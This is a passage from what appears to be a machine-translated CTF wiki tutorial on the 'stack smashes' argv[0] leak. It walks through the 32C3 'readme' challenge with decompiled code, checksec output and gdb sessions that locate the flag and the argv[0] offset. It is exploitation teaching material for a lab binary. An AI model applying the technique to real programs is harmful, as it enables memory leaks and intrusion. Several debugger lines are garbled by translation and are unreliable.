  <span class="n">__fortify_fail</span> <span class="p">(</span><span class="s">&quot;stack smashing detected&quot;</span><span class="p">);</span>

<span class="p">}</span>

<span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="k">noreturn</span><span class="p">))</span> <span class="n">internal_function</span> <span class="n">__fortify_fail</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>

<span class="p">{</span>

  <span class="cm">/* The loop is added only to keep gcc happy.  */</span>

  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">__libc_message</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;*** %s ***: %s terminated</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>

                    <span class="n">msg</span><span class="p">,</span> <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?:</span> <span class="s">&quot;&lt;unknown&gt;&quot;</span><span class="p">);</span>

<span class="p">}</span>
</code></pre></div>
<p>So if we use stack overflow to override argv[0] for the address of the string we want to output, then we will output the information we want in the <code>__fortify_fail</code> function.</p>
<h3 id="32c3-ctf-readme">32C3 CTF readme<a class="headerlink" href="#32c3-ctf-readme" title="Permanent link">&para;</a></h3>
<p>Here, we introduce the 2015 32C3 CTF readme as an example, which is reproduced on jarvisoj.</p>
<h4 id="determining-protection">Determining protection<a class="headerlink" href="#determining-protection" title="Permanent link">&para;</a></h4>
<p>It can be seen that the program is 64-bit, mainly enabling Canary protection and NX protection, as well as FORTIFY protection.</p>
<div class="highlight"><pre><span></span><code>➜  stacksmashes git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec smashes

    Arch:     amd64-64-little

    RELRO:    No RELRO

    Stack:    Canary found

    NX:       NX enabled

    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>

    FORTIFY:  Enabled
</code></pre></div>
<h4 id="_3">分析程序<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h4>
<p>Ida look</p>
<div class="highlight"><pre><span></span><code><span class="kr">__int64</span> <span class="nf">sub_4007E0</span><span class="p">()</span>

<span class="p">{</span>

<span class="kr">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// rax @ 1</span>
  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx@2</span>

  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// eax@3</span>

<span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp + 0h] [bp-128h] @ 1</span>
  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+108h] [bp-20h]@1</span>



  <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mf">40L</span><span class="n">L</span><span class="p">);</span>

  <span class="n">__printf_chk</span><span class="p">(</span><span class="mf">1L</span><span class="n">L</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="s">&quot;Hello!</span><span class="se">\n</span><span class="s">What&#39;s your name? &quot;</span><span class="p">);</span>

<span class="n">LODWORD</span> <span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">_IO_gets</span> <span class="p">((</span><span class="n">__</span> <span class="n">int64</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">v4</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v0</span> <span class="p">)</span>

<span class="nl">LABEL_9</span><span class="p">:</span>

    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

  <span class="n">v1</span> <span class="o">=</span> <span class="mf">0L</span><span class="n">L</span><span class="p">;</span>

  <span class="n">__printf_chk</span><span class="p">(</span><span class="mf">1L</span><span class="n">L</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="s">&quot;Nice to meet you, %s.</span><span class="se">\n</span><span class="s">Please overwrite the flag: &quot;</span><span class="p">);</span>

  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>

  <span class="p">{</span>

    <span class="n">v2</span> <span class="o">=</span> <span class="n">_IO_getc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="mi">-1</span> <span class="p">)</span>

      <span class="k">goto</span> <span class="n">LABEL_9</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="p">)</span>

      <span class="k">break</span><span class="p">;</span>

    <span class="n">byte_600D20</span><span class="p">[</span><span class="n">v1</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="sc">&#39; &#39;</span> <span class="p">)</span>

      <span class="k">goto</span> <span class="n">LABEL_8</span><span class="p">;</span>

  <span class="p">}</span>

  <span class="n">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mh">0x600D20LL</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v1</span><span class="p">));</span>

<span class="nl">LABEL_8</span><span class="p">:</span>

  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Thank you, bye!&quot;</span><span class="p">);</span>

  <span class="k">return</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mf">40L</span><span class="n">L</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>

<span class="p">}</span>
</code></pre></div>
<p>Obviously, the program has a stack overflow in <code>_IO_gets((__int64)&amp;amp;v4)</code>;</p>
<p>In addition, the program also prompts to overwrite the flag. And found that the program is very interesting to execute this statement after the while loop</p>
<div class="highlight"><pre><span></span><code>  <span class="n">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mh">0x600D20LL</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v1</span><span class="p">));</span>
</code></pre></div>
<p>Looking at the contents of the corresponding address, you can find the following content, indicating that the flag of the program is here.</p>
<div class="highlight"><pre><span></span><code>.data:0000000000600D20 ; char aPctfHereSTheFl[]

.data:0000000000600D20 aPctfHereSTheFl db &#39;PCTF{Here&#39;,27h,&#39;s the flag on server}&#39;,0
</code></pre></div>
<p>But if we directly use the stack overflow to output the contents of the address is not feasible, this is because the content we read <code>byte_600D20[v1++] = v2;</code> is exactly the block memory, which will directly overwrite it, this We need to use a skill.</p>
<ul>
<li>When ELF memory maps, the bss section is mapped twice, so we can use another address for output, which can be found using gdb&#39;s find.</li>
</ul>
<h4 id="determine-the-flag-address">Determine the flag address<a class="headerlink" href="#determine-the-flag-address" title="Permanent link">&para;</a></h4>
<p>We download the breakpoint from the memset function and read the corresponding content as follows</p>
<div class="highlight"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">c</span>

<span class="nf">Continuing.</span>

<span class="nf">Hello</span><span class="p">!</span>

<span class="nf">What</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">your</span> <span class="no">name</span><span class="err">?</span> <span class="no">qqqqqqq</span>

<span class="nf">Nice</span> <span class="no">to</span> <span class="no">meet</span> <span class="no">you</span><span class="p">,</span> <span class="no">qqqqqqq.</span>

<span class="nf">Please</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">flag</span><span class="p">:</span> <span class="mi">222222222</span>



<span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="no">__memset_avx2</span> <span class="p">()</span> <span class="no">at</span> <span class="no">..</span><span class="err">/</span><span class="no">sysdeps</span><span class="err">/</span><span class="no">x86_64</span><span class="err">/</span><span class="no">multiarch</span><span class="err">/</span><span class="no">memset-avx2.S</span><span class="p">:</span><span class="mi">38</span>

<span class="err">38</span> <span class="nf">..</span><span class="err">/</span><span class="no">sysdeps</span><span class="err">/</span><span class="no">x86_64</span><span class="err">/</span><span class="no">multiarch</span><span class="err">/</span><span class="no">memset-avx2.S</span><span class="p">:</span> <span class="no">There</span> <span class="no">is</span> <span class="no">no</span> <span class="no">such</span> <span class="no">file</span> <span class="no">or</span> <span class="no">directory.</span>
<span class="err">─────────────────────────────────────[</span> <span class="nl">code:i386:</span><span class="nf">x86-64</span> <span class="p">]</span><span class="err">────</span>

   <span class="err">0</span><span class="nf">x7ffff7b7f920</span> <span class="err">&lt;</span><span class="no">__memset_chk_avx2</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">cmp</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">rdx</span>

   <span class="err">0</span><span class="nf">x7ffff7b7f923</span> <span class="err">&lt;</span><span class="no">__memset_chk_avx2</span><span class="err">+</span><span class="mi">3</span><span class="err">&gt;</span> <span class="no">jb</span>     <span class="mh">0x7ffff7b24110</span> <span class="p">&lt;</span><span class="no">__GI___chk_fail</span><span class="p">&gt;</span>

   <span class="err">0</span><span class="nf">x7ffff7b7f929</span>                  <span class="no">nop</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="mi">0x0</span><span class="p">]</span>

 <span class="err">→</span> <span class="err">0</span><span class="nf">x7ffff7b7f930</span> <span class="err">&lt;</span><span class="no">__memset_avx2</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">vpxor</span>  <span class="no">xmm0</span><span class="p">,</span> <span class="no">xmm0</span><span class="p">,</span> <span class="no">xmm0</span>

   <span class="err">0</span><span class="nf">x7ffff7b7f934</span> <span class="err">&lt;</span><span class="no">__memset_avx2</span><span class="err">+</span><span class="mi">4</span><span class="err">&gt;</span> <span class="no">vmovd</span>  <span class="no">xmm1</span><span class="p">,</span> <span class="no">esi</span>

   <span class="err">0</span><span class="nf">x7ffff7b7f938</span> <span class="err">&lt;</span><span class="no">__memset_avx2</span><span class="err">+</span><span class="mi">8</span><span class="err">&gt;</span> <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x7ffff7b7f93c</span> <span class="err">&lt;</span><span class="no">__memset_avx2</span><span class="err">+</span><span class="mi">12</span><span class="err">&gt;</span> <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">rdi</span>

<span class="err">───────────────────────────────────────────────────────────────────[</span> <span class="nf">stack</span> <span class="p">]</span><span class="err">────</span>

<span class="err">[&#39;0</span><span class="nf">x7fffffffda38</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>

<span class="err">8</span>

<span class="err">0</span><span class="nf">x00007fffffffda38</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x0000000000400878</span>  <span class="err">→</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x40094e</span>  <span class="err">←</span> <span class="no">$rsp</span>

<span class="err">0</span><span class="nf">x00007fffffffda40</span><span class="err">│+</span><span class="mi">0x08</span><span class="p">:</span> <span class="mi">0x0071717171717171</span> <span class="p">(</span><span class="err">&quot;</span><span class="no">qqqqqqq</span><span class="err">&quot;?</span><span class="p">)</span>

<span class="err">0</span><span class="nf">x00007fffffffda48</span><span class="err">│+</span><span class="mi">0x10</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffda50</span><span class="err">│+</span><span class="mi">0x18</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffda58</span><span class="err">│+</span><span class="mi">0x20</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffda60</span><span class="err">│+</span><span class="mi">0x28</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffda68</span><span class="err">│+</span><span class="mi">0x30</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffda70</span><span class="err">│+</span><span class="mi">0x38</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">──────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">trace</span> <span class="p">]</span><span class="err">────</span>

<span class="err">[</span><span class="c1">#0] 0x7ffff7b7f930 → Name: __memset_avx2()</span>

<span class="err">[</span><span class="c1"># 1] 0x400878 → mov edi, 0x40094e</span>
<span class="err">──────────────────────────────────────────────────────────────────────────────</span>

<span class="nf">gef</span><span class="err">➤</span>  <span class="no">find</span> <span class="mi">22222</span>

<span class="nf">Argument</span> <span class="no">required</span> <span class="p">(</span><span class="no">expression</span> <span class="no">to</span> <span class="no">compute</span><span class="p">).</span>

<span class="nf">gef</span><span class="err">➤</span>  <span class="no">find</span> <span class="err">&#39;</span><span class="mi">22222</span><span class="err">&#39;</span>

<span class="nf">No</span> <span class="no">symbol</span> <span class="err">&quot;</span><span class="mi">22222</span><span class="err">&quot;</span> <span class="no">in</span> <span class="no">current</span> <span class="no">context.</span>

<span class="nf">given</span> <span class="no">grip</span> <span class="err">&amp;</span><span class="mi">#39</span><span class="c1">;22222&amp;#39;</span>
<span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="mi">22222</span><span class="err">&#39;</span> <span class="no">in</span> <span class="no">memory</span>

<span class="err">[+]</span> <span class="nf">In</span> <span class="err">&#39;/</span><span class="no">mnt</span><span class="err">/</span><span class="no">hgfs</span><span class="err">/</span><span class="no">Hack</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">ctf-wiki</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">stackoverflow</span><span class="err">/</span><span class="no">example</span><span class="err">/</span><span class="no">stacksmashes</span><span class="err">/</span><span class="no">smashes</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x600000-0</span><span class="no">x601000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rw-</span>

  <span class="err">0</span><span class="nf">x600d20</span> <span class="p">-</span> <span class="mi">0x600d3f</span>  <span class="err">→</span>   <span class="err">&quot;</span><span class="mi">222222222</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">the</span> <span class="no">flag</span> <span class="no">on</span> <span class="no">server</span><span class="err">}&quot;</span> 

<span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">In</span> <span class="err">&#39;</span><span class="p">[</span><span class="no">heap</span><span class="p">]</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x601000-0</span><span class="no">x622000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rw-</span>

  <span class="err">0</span><span class="nf">x601010</span> <span class="p">-</span> <span class="mi">0x601019</span>  <span class="err">→</span>   <span class="err">&quot;</span><span class="mi">222222222</span><span class="err">&quot;</span> 

<span class="no">donated</span> <span class="no">PCTF</span>
<span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">PCTF</span><span class="err">&#39;</span> <span class="no">in</span> <span class="no">memory</span>

<span class="err">[+]</span> <span class="nf">In</span> <span class="err">&#39;/</span><span class="no">mnt</span><span class="err">/</span><span class="no">hgfs</span><span class="err">/</span><span class="no">Hack</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">ctf-wiki</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">stackoverflow</span><span class="err">/</span><span class="no">example</span><span class="err">/</span><span class="no">stacksmashes</span><span class="err">/</span><span class="no">smashes</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x400000-0</span><span class="no">x401000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">r-x</span>

  <span class="err">0</span><span class="nf">x400d20</span> <span class="p">-</span> <span class="mi">0x400d3f</span>  <span class="err">→</span>   <span class="err">&quot;</span><span class="no">PCTF</span><span class="err">{</span><span class="no">Here</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">the</span> <span class="no">flag</span> <span class="no">on</span> <span class="no">server</span><span class="err">}&quot;</span> 
</code></pre></div>
<p>It can be seen that the 2222 we read has covered the flag at 0x600d20, but we still find the backup of this flag at 0x400d20 in memory, so we can still output it. Here we have determined the address of the flag.</p>
<h4 id="determining-the-offset">Determining the offset<a class="headerlink" href="#determining-the-offset" title="Permanent link">&para;</a></h4>
<p>Next, we determine the offset of the string read by argv[0].</p>
<p>First break the breakpoint at the main function entry, as follows</p>
<div class="highlight"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">b</span> <span class="p">*</span><span class="mi">0x00000000004006D0</span>

<span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="no">at</span> <span class="mi">0x4006d0</span>

<span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>

<span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">mnt</span><span class="err">/</span><span class="no">hgfs</span><span class="err">/</span><span class="no">Hack</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">ctf-wiki</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">stackoverflow</span><span class="err">/</span><span class="no">example</span><span class="err">/</span><span class="no">stacksmashes</span><span class="err">/</span><span class="no">smashes</span> 



<span class="no">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0x00000000004006d0</span> <span class="no">in</span> <span class="err">??</span> <span class="p">()</span>

 <span class="nl">code:i386:</span><span class="nf">x86-64</span> <span class="p">]</span><span class="err">────</span>

     <span class="err">0</span><span class="nf">x4006c0</span> <span class="err">&lt;</span><span class="no">_IO_gets@plt</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">jmp</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x20062a</span><span class="p">]</span>        <span class="c1"># 0x600cf0 &lt;_IO_gets@got.plt&gt;</span>

     <span class="err">0</span><span class="nf">x4006c6</span> <span class="err">&lt;</span><span class="no">_IO_gets@plt</span><span class="err">+</span><span class="mi">6</span><span class="err">&gt;</span> <span class="no">push</span>   <span class="mi">0x9</span>

     <span class="err">0</span><span class="nf">x4006cb</span> <span class="err">&lt;</span><span class="no">_IO_gets@plt</span><span class="err">+</span><span class="mi">11</span><span class="err">&gt;</span> <span class="no">jmp</span>    <span class="mi">0x400620</span>

 <span class="err">→</span>   <span class="err">0</span><span class="nf">x4006d0</span>                  <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x8</span>

<span class="err">0</span><span class="nf">x4006d4</span> <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span> <span class="err">+</span> <span class="mi">0x200665</span><span class="p">]</span> <span class="c1"># 0x600d40 &lt;stdout&gt;</span>
<span class="err">0</span><span class="nf">x4006db</span> <span class="no">xi</span><span class="p">,</span> <span class="no">oh</span>
     <span class="err">0</span><span class="nf">x4006dd</span>                  <span class="no">call</span>   <span class="mh">0x400660</span> <span class="p">&lt;</span><span class="no">setbuf@plt</span><span class="p">&gt;</span>

<span class="err">──────────────────────────────────────────────────────────────────[</span> <span class="nf">stack</span> <span class="p">]</span><span class="err">────</span>

<span class="err">[&#39;0</span><span class="nf">x7fffffffdb78</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>

<span class="err">8</span>

<span class="err">0</span><span class="nf">x00007fffffffdb78</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x00007ffff7a2d830</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">240</span><span class="err">&gt;</span> <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>    <span class="err">←</span> <span class="no">$rsp</span>

<span class="err">0</span><span class="nf">x00007fffffffdb80</span><span class="err">│+</span><span class="mi">0x08</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffdb88</span><span class="err">│+</span><span class="mi">0x10</span><span class="p">:</span> <span class="mi">0x00007fffffffdc58</span>  <span class="err">→</span>  <span class="mi">0x00007fffffffe00b</span>  <span class="err">→</span>  <span class="err">&quot;/</span><span class="no">mnt</span><span class="err">/</span><span class="no">hgfs</span><span class="err">/</span><span class="no">Hack</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">ctf-wiki</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">stackoverflow</span><span class="err">/</span><span class="no">exam</span><span class="p">[...]</span><span class="err">&quot;</span>

<span class="err">0</span><span class="nf">x00007fffffffdb90</span><span class="err">│+</span><span class="mi">0x18</span><span class="p">:</span> <span class="mi">0x0000000100000000</span>

<span class="err">0</span><span class="nf">x00007fffffffdb98</span><span class="err">│+</span><span class="mi">0x20</span><span class="p">:</span> <span class="mi">0x00000000004006d0</span>  <span class="err">→</span>   <span class="no">sub</span> <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x8</span>

<span class="err">0</span><span class="nf">x00007fffffffdba0</span><span class="err">│+</span><span class="mi">0x28</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffdba8</span><span class="err">│+</span><span class="mi">0x30</span><span class="p">:</span> <span class="mi">0x48c916d3cf726fe3</span>

<span class="err">0</span><span class="nf">x00007fffffffdbb0</span><span class="err">│+</span><span class="mi">0x38</span><span class="p">:</span> <span class="mi">0x00000000004006ee</span>  <span class="err">→</span>   <span class="no">xor</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>

<span class="err">──────────────────────────────────────────────────────────────[</span> <span class="nf">trace</span> <span class="p">]</span><span class="err">────</span>

<span class="err">[</span><span class="c1">#0] 0x4006d0 → sub rsp, 0x8</span>

<span class="err">[</span><span class="c1">#1] 0x7ffff7a2d830 → Name: __libc_start_main(main=0x4006d0, argc=0x1, argv=0x7fffffffdc58, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdc48)</span>

<span class="err">---</span><span class="nf">Type</span> <span class="err">&lt;</span><span class="no">return</span><span class="err">&gt;</span> <span class="no">to</span> <span class="no">continue</span><span class="p">,</span> <span class="no">or</span> <span class="mh">q</span> <span class="p">&lt;</span><span class="no">return</span><span class="p">&gt;</span> <span class="no">to</span> <span class="no">quit---</span>

<span class="err">[</span><span class="c1"># 2] 0x400717 → holds</span>
</code></pre></div>
<p>It can be seen that 0x00007fffffffe00b points to the program name, which is naturally argv[0], so the content we modified is this address. At the same time, the address is kept at 0x00007fffffffdc58, so the address we really need is 0x00007fffffffdc58.</p>
<p>Also, according to the assembly code</p>
<div class="highlight"><pre><span></span><code><span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">E0</span>                 <span class="no">push</span>    <span class="no">rbp</span>

<span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">E1</span>                 <span class="no">mov</span>     <span class="no">esi</span><span class="p">,</span> <span class="no">offset</span> <span class="no">aHelloWhatSYour</span> <span class="c1">; &quot;Hello!\nWhat&#39;s your name? &quot;</span>

<span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">E6</span>                 <span class="no">mov</span>     <span class="no">edi</span><span class="p">,</span> <span class="mi">1</span>

<span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">EB</span>                 <span class="no">push</span>    <span class="no">rbx</span>

<span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">EC</span>                 <span class="no">sub</span>     <span class="no">rsp</span><span class="p">,</span> <span class="mi">118</span><span class="no">h</span>

<span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">F3</span>                 <span class="no">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">fs</span><span class="p">:</span><span class="mi">28</span><span class="no">h</span>

<span class="nl">.text:</span><span class="err">00000000004007</span><span class="nf">FC</span>                 <span class="no">mov</span>     <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">128</span><span class="no">h</span><span class="err">+</span><span class="no">var_20</span><span class="p">],</span> <span class="no">rax</span>

<span class="nl">.text:</span><span class="err">0000000000400804</span>                 <span class="nf">xor</span>     <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>

<span class="nl">.text:</span><span class="err">0000000000400806</span>                 <span class="nf">call</span>    <span class="no">___printf_chk</span>

<span class="nl">.text:</span><span class="err">000000000040080</span><span class="nf">B</span>                 <span class="no">mov</span>     <span class="no">rdi</span><span class="p">,</span> <span class="no">rsp</span>

<span class="nl">.text:</span><span class="err">000000000040080</span><span class="nf">E</span>                 <span class="no">call</span>    <span class="no">__IO_gets</span>
</code></pre></div>
<p>We can make sure that the starting address of the string we read is actually the rsp before calling <code>__IO_gets</code>, so we put the breakpoint at the call, as follows</p>
<div class="highlight"><pre><span></span><code><span class="nf">gef</span><span class="err">➤</span>  <span class="no">b</span> <span class="p">*</span><span class="mi">0x000000000040080E</span>

<span class="nf">Breakpoint</span> <span class="mi">2</span> <span class="no">at</span> <span class="mi">0x40080e</span>

<span class="nf">gef</span><span class="err">➤</span>  <span class="no">c</span>

<span class="nf">Continuing.</span>

<span class="nf">Hello</span><span class="p">!</span>

<span class="nf">What</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">your</span> <span class="no">name</span><span class="err">?</span> 

<span class="no">Breakpoint</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0x000000000040080e</span> <span class="no">in</span> <span class="err">??</span> <span class="p">()</span>

<span class="err">──────────────────────────[</span> <span class="nl">code:i386:</span><span class="nf">x86-64</span> <span class="p">]</span><span class="err">────</span>

     <span class="err">0</span><span class="nf">x400804</span>                  <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>

     <span class="err">0</span><span class="nf">x400806</span>                  <span class="no">call</span>   <span class="mh">0x4006b0</span> <span class="p">&lt;</span><span class="no">__printf_chk@plt</span><span class="p">&gt;</span>

     <span class="err">0</span><span class="nf">x40080b</span>                  <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">rsp</span>

 <span class="err">→</span>   <span class="err">0</span><span class="nf">x40080e</span>                  <span class="no">call</span>   <span class="mh">0x4006c0</span> <span class="p">&lt;</span><span class="no">_IO_gets@plt</span><span class="p">&gt;</span>

   <span class="err">↳</span>    <span class="err">0</span><span class="nf">x4006c0</span> <span class="err">&lt;</span><span class="no">_IO_gets@plt</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">jmp</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x20062a</span><span class="p">]</span>        <span class="c1"># 0x600cf0 &lt;_IO_gets@got.plt&gt;</span>

        <span class="err">0</span><span class="nf">x4006c6</span> <span class="err">&lt;</span><span class="no">_IO_gets@plt</span><span class="err">+</span><span class="mi">6</span><span class="err">&gt;</span> <span class="no">push</span>   <span class="mi">0x9</span>

        <span class="err">0</span><span class="nf">x4006cb</span> <span class="err">&lt;</span><span class="no">_IO_gets@plt</span><span class="err">+</span><span class="mi">11</span><span class="err">&gt;</span> <span class="no">jmp</span>    <span class="mi">0x400620</span>

        <span class="err">0</span><span class="nf">x4006d0</span>                  <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x8</span>

<span class="err">──────────────────[</span> <span class="nf">stack</span> <span class="p">]</span><span class="err">────</span>

<span class="err">[&#39;0</span><span class="nf">x7fffffffda40</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>

<span class="err">8</span>

<span class="err">0</span><span class="nf">x00007fffffffda40</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x0000ff0000000000</span>     <span class="err">←</span> <span class="no">$rsp</span><span class="p">,</span> <span class="no">$rdi</span>

<span class="err">0</span><span class="nf">x00007fffffffda48</span><span class="err">│+</span><span class="mi">0x08</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffda50</span><span class="err">│+</span><span class="mi">0x10</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffda58</span><span class="err">│+</span><span class="mi">0x18</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

<span class="err">0</span><span class="nf">x00007fffffffda60</span><span class="err">│+</span><span class="mi">0x20</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>

